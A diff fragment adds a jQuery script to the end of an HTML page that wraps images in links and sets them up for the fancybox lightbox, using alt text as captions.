+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+
+
+</body>
+</html>
